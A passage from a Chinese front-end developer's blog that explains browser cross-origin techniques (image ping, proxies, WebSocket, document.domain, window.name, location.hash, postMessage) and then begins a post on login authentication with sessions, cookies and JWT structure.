</ul>
<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>只支持 GET 请求。</li>
<li>由于是从其它域中加载代码执行，因此如果其他域不安全，很可能会在响应中夹带一些恶意代码，所以只能请求内部域。</li>
<li>要确定 JSONP 请求是否失败并不容易。虽然 HTML5 给 script 标签新增了一个 onerror 事件处理程序，但是存在兼容性问题。</li>
</ul>
<p>​</p>
<p>​</p>
<p>​</p>
<h3 id="图像-Ping-跨域"><a href="#图像-Ping-跨域" class="headerlink" title="图像 Ping 跨域"></a>图像 Ping 跨域</h3><p>由于 img 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过 img 标签的 src 属性进行跨域。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过 onload 及 onerror 事件可以知道响应是什么时候接收到的，但是不能获取响应文本</span></span><br><span class="line">img.<span class="property">onload</span> = img.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求数据通过查询字符串形式发送</span></span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://www.laixiangran.cn/test?name=laixiangran&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h4><ul>
<li>用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。（只需发送不需处理，且向第三方数据平台一般都是跨域）</li>
</ul>
<h4 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>只支持 GET 请求。</li>
<li>只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。</li>
</ul>
<p>​</p>
<p>​</p>
<p>​</p>
<h3 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h3><p>浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所有域的资源再返回给客户端。锅甩后端。<br><img src="https://cdn.nlark.com/yuque/0/2021/webp/106384/1631608361434-08067c19-38f8-4b21-864c-608f28d7418e.webp#clientId=u9b6880e2-d3c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=ubc8a7b85&margin=%5Bobject%20Object%5D&originHeight=316&originWidth=594&originalType=url%E2%88%B6=1&rotation=0&showTitle=false&status=done&style=none&taskId=u0082eef7-9e9a-4e9d-9caa-fb9d34dbfa1&title="></p>
<h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><p>websocket 是 Html5 一种新的协议，基于该协议可以做到浏览器与服务器全双工通信，允许跨域请求。但浏览器一定版本要求，服务器需要支持 websocket 协议。<br>​</p>
<h2 id="DOM-跨域"><a href="#DOM-跨域" class="headerlink" title="DOM 跨域"></a>DOM 跨域</h2><h3 id="document-domain-跨域"><a href="#document-domain-跨域" class="headerlink" title="document.domain 跨域"></a>document.domain 跨域</h3><p>对于主域名相同，而子域名不同的情况，可以使用 document.domain 来跨域。这种方式非常适用于 iframe 跨域获取 DOM 节点信息的情况。<br>比如，有一个页面，它的地址是 <code>http://www.laixiangran.cn/a.html</code>，在这个页面里面有一个 iframe，它的 src 是<code> http://laixiangran.cn/b.html</code>。很显然，这个页面与它里面的 iframe 框架是不同域的，所以我们是无法通过在页面中书写 js 代码来获取 iframe 中的东西的。<br>这个时候，document.domain 就可以派上用场了，我们只要把<code>http://www.laixiangran.cn/a.html</code>和 <code>http://laixiangran.cn/b.html </code>这两个页面的 document.domain 都设成相同的域名就可以了。但要注意的是，document.domain 的设置是有限制的，我们只能把 document.domain 设置成自身或更高一级的父域，且主域必须相同。<br>例如：a.b.laixiangran.cn 中某个文档的 document.domain 可以设成 a.b.laixiangran.cn、b.laixiangran.cn 、laixiangran.cn 中的任意一个，但是不可以设成 c.a.b.laixiangran.cn ，因为这是当前域的<strong>子域</strong>，也不可以设成 baidu.com，因为主域已经不相同了。<br>例如，在页面 <a target="_blank" rel="noopener" href="http://www.laixiangran.cn/a.html">http://www.laixiangran.cn/a.html</a> 中设置 document.domain：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// a.html</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&quot;laixiangran.cn&quot;</span>; <span class="comment">// 设置成主域</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myIframe&quot;</span>).<span class="property">contentWindow</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;/iframe</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>在页面 <a target="_blank" rel="noopener" href="http://laixiangran.cn/b.html">http://laixiangran.cn/b.html</a> 中也设置 document.domain，而且这也是必须的，虽然这个文档的 domain 就是 laixiangran.cn，但是还是必须显式地设置 document.domain 的值：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// b.html</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&quot;laixiangran.cn&quot;</span>; <span class="comment">// document.domain 设置成与主页面相同</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样，<code>http://www.laixiangran.cn/a.html </code>就可以通过 js 访问到<code> http://laixiangran.cn/b.html</code>中的各种属性和对象了。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>window.name 跨域<br>充其量最多算传递消息吧，还只能是字符串的形式，没啥用。<br>window 对象有个 name 属性，该属性有个特征：即在一个窗口（window）的生命周期内，窗口载入的所有的页面（不管是相同域的页面还是不同域的页面）都是共享一个 window.name 的，每个页面对 window.name 都有读写的权限，window.name 是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。<br>页面 <a target="_blank" rel="noopener" href="http://www.laixiangran.cn/a.html">http://www.laixiangran.cn/a.html</a> 的代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myIframe&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 重置 iframe 的 onload 事件程序，</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 此时经过后面代码重置 src 之后，</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// http://www.laixiangran.cn/a.html 页面与该 iframe 在同一个源了，可以相互访问了</span></span></span><br><span class="line"><span class="language-javascript">      iframe.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> data = iframe.<span class="property">contentWindow</span>.<span class="property">name</span>; <span class="comment">// 4. 获取 iframe 里的 window.name</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data); <span class="comment">// hello world!</span></span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 3. 重置一个与 http://www.laixiangran.cn/a.html 页面同源的页面</span></span></span><br><span class="line"><span class="language-javascript">      iframe.<span class="property">src</span> = <span class="string">&quot;http://www.laixiangran.cn/c.html&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;/iframe</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>页面 <a target="_blank" rel="noopener" href="http://www.laixiangran.cn/b.html">http://www.laixiangran.cn/b.html</a> 的代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 1. 给当前的 window.name 设置一个 http://www.laixiangran.cn/a.html 页面想要得到的数据值</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">name</span> = <span class="string">&quot;hello world!&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​</p>
<h3 id="location-hash-跨域"><a href="#location-hash-跨域" class="headerlink" title="location.hash 跨域"></a>location.hash 跨域</h3><p>location.hash 方式跨域，是子框架修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。<br>页面 <a target="_blank" rel="noopener" href="http://www.laixiangran.cn/a.html">http://www.laixiangran.cn/a.html</a> 的代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 3. 获取通过 http://laixiangran.cn/b.html 页面设置 hash 值</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> data = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;/iframe</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>页面 <a target="_blank" rel="noopener" href="http://www.laixiangran.cn/b.html">http://www.laixiangran.cn/b.html</a> 的代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 1. 设置父页面的 hash 值</span></span></span><br><span class="line"><span class="language-javascript">  parent.<span class="property">location</span>.<span class="property">hash</span> = <span class="string">&quot;world&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="postMessage-跨域"><a href="#postMessage-跨域" class="headerlink" title="postMessage 跨域*"></a>postMessage 跨域*</h3><p>window.postMessage(message，targetOrigin) 方法是 HTML5 新引进的特性，可以使用它来向其它的 window 对象发送消息，无论这个 window 对象是属于同源或不同源。这个应该就是以后解决 dom 跨域通用方法了。<br>调用 postMessage 方法的 window 对象是指要接收消息的那一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrigin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。<br>需要接收消息的 window 对象，可是通过监听自身的 message 事件来获取传过来的消息，消息内容储存在该事件对象的 data 属性中。<br>页面 <a target="_blank" rel="noopener" href="http://www.laixiangran.cn/a.html">http://www.laixiangran.cn/a.html</a> 的代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 2. 获取 http://laixiangran.cn/b.html 页面的 window 对象，</span></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 然后通过 postMessage 向 http://laixiangran.cn/b.html 页面发送消息</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myIframe&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> win = iframe.<span class="property">contentWindow</span>;</span></span><br><span class="line"><span class="language-javascript">      win.<span class="title function_">postMessage</span>(</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&quot;我是来自 http://www.laixiangran.cn/a.html 页面的消息&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&quot;*&quot;</span></span></span><br><span class="line"><span class="language-javascript">      );</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面 <a target="_blank" rel="noopener" href="http://www.laixiangran.cn/b.html">http://www.laixiangran.cn/b.html</a> 的代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 注册 message 事件用来接收消息</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    e = e || event; <span class="comment">// 获取事件对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>); <span class="comment">// 通过 data 属性得到发送来的消息</span></span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6999919548904243237">https://juejin.cn/post/6999919548904243237</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903681683357710">https://juejin.cn/post/6844903681683357710</a><br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/09/07/%E7%99%BB%E5%BD%95%E9%89%B4%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="CatcherInSky">
      <meta itemprop="description" content="CatcherInSky的前端知识库">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/09/07/%E7%99%BB%E5%BD%95%E9%89%B4%E6%9D%83/" class="post-title-link" itemprop="url">登录鉴权</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-09-07 17:33:09" itemprop="dateCreated datePublished" datetime="2021-09-07T17:33:09+08:00">2021-09-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-14 19:41:04" itemprop="dateModified" datetime="2022-02-14T19:41:04+08:00">2022-02-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h2><p>HASH 加盐，防止脱库<br>​</p>
<h2 id="session-cookie"><a href="#session-cookie" class="headerlink" title="session-cookie"></a>session-cookie</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1631008228603-e8490bb9-d8c4-4a19-9eda-acdc346f17ff.png#clientId=u35155496-a643-4&from=paste&id=u9f0126be&margin=%5Bobject%20Object%5D&name=image.png&originHeight=555&originWidth=784&originalType=url%E2%88%B6=1&size=45655&status=done&style=none&taskId=u786911ba-ac84-42c7-88d4-edf3bb36164" alt="image.png"></p>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol>
<li>客户端带着用户名和密码去访问 /login 接口，服务器端收到后校验用户名和密码，校验正确就会在服务器端存储一个 sessionId 和 session 的映射关系</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1631583981905-815103d3-dccb-445a-a998-b623531c3fe8.png#clientId=u60fdaa12-1e32-4&from=paste&id=u9d08525d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=331&originWidth=639&originalType=url%E2%88%B6=1&size=19845&status=done&style=none&taskId=u35150456-7083-46f7-82eb-6e15c8a8fca" alt="image.png"></p>
<ol start="2">
<li>服务器端返回 response，并且将 sessionId 以 set-cookie 的方式存在了客户端</li>
<li>客户端发起非登录请求时，服务端通过 cookie 中的 sessionId 找到对应的 session</li>
</ol>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ol>
<li>服务器保存 session，访问量大有压力，可被 CSRF 攻击。</li>
<li>跨域时不特殊处理不发传递 cookie</li>
<li>对分布式扩展、微服务模式等扩展的时候，不将验证鉴权独立出来无法做好单点登录、用户风控之类的体</li>
</ol>
<h2 id="token-JWT"><a href="#token-JWT" class="headerlink" title="token-JWT"></a>token-JWT</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1631526715996-ebac69c8-0b71-4513-bf1a-e717514627cb.png#clientId=u60fdaa12-1e32-4&from=paste&id=u6ddb9c9a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1100&originWidth=1600&originalType=url%E2%88%B6=1&size=453992&status=done&style=none&taskId=uaf7d5c66-cda4-4c5a-a41f-677b4947515" alt="image.png"><br>通过解析 token 的计算时间换取了 session 的存储空间，将用户状态信息生成 token 存在客户端，每次发请求时带上并解析<br>​</p>
<h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><ol>
<li>客户端使用用户名跟密码请求登录</li>
<li>服务端收到请求，去验证用户名与密码</li>
<li>验证成功后，服务端会签发一个令牌(Token)，再把这个 Token 发送给客户端</li>
<li>客户端收到 Token 以后可以把它存储起来， Cookie / Local Storag</li>
<li>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</li>
<li>服务端收到请求，然后去验证客户端请求带着的 Token，如果验证成功，就向客户端返回请求的数据 token 会有过期时间，客户端登出的时候也会废弃 token，但是服务端不不需要任何操作</li>
</ol>
<h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>JWT 只是一个 token 生成标准，一个 JWT token 是一个字符串，它由三部分组成，令牌头、载荷（payload）与签名（Signature），用<code>.</code>分割,用 Base64Url 编码<br><img src="https://cdn.nlark.com/yuque/0/2021/webp/106384/1631523645721-6bbfd2c4-1ab9-4ef5-95bc-d7513eb077bc.webp#clientId=u60fdaa12-1e32-4&from=paste&id=u92d2812a&margin=%5Bobject%20Object%5D&originHeight=141&originWidth=645&originalType=url%E2%88%B6=1&status=done&style=none&taskId=uccd197f8-6be7-40b6-9bdb-09d743a01cc"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jwt =</span><br><span class="line">  <span class="title function_">base64url</span>(header) +</span><br><span class="line">  <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  <span class="title function_">base64url</span>(payload) +</span><br><span class="line">  <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  <span class="title class_">HMACSHA256</span>(<span class="title function_">base64UrlEncode</span>(header) + <span class="string">&quot;.&quot;</span> + <span class="title function_">base64UrlEncode</span>(payload), secret);</span><br><span class="line"><span class="comment">// header payload是明文编码，signature是由header、payload和服务器信息加密得来，密码不能出现在jwt中</span></span><br></pre></td></tr></table></figure>

<h4 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h4><p>包括 token 类型<code>typ</code>，签名算法名称<code>alg</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// HS256 SHA-256 的 HMAC 对称算法 注意确保密钥不被泄密 密钥由服务端持有</span></span><br><span class="line">  <span class="comment">// RS256 采用SHA-256 的 RSA 签名 非对称算法 JWT 的使用方获取公钥以验证签名, 比如一个元数据URL</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后用 Base64Url 编码得到头部</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ewogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9</span><br></pre></td></tr></table></figure>

<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p>包括预定义（Registered）、公有（Public）、私有（Private）<br><strong>Registered</strong><br>前 7 个字段都是由官方所预定义（Registered claims）的，并不都是必需的</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span> <span class="comment">//主题</span></span><br><span class="line">  <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://localhost:8000/auth/login&quot;</span><span class="punctuation">,</span> <span class="comment">//该JWT的签发者</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1451888119</span><span class="punctuation">,</span> <span class="comment">//issued at在什么时候签发的</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1454516119</span><span class="punctuation">,</span> <span class="comment">// 什么时候过期，这里是一个Unix时间戳</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span> <span class="number">1451888119</span><span class="punctuation">,</span> <span class="comment">//生效时间，在此之前是无效的</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;37c107e4609ddbcc9c096ea5ee76c667&quot;</span><span class="punctuation">,</span> <span class="comment">//编号</span></span><br><span class="line">  <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dev&quot;</span> <span class="comment">//受众</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

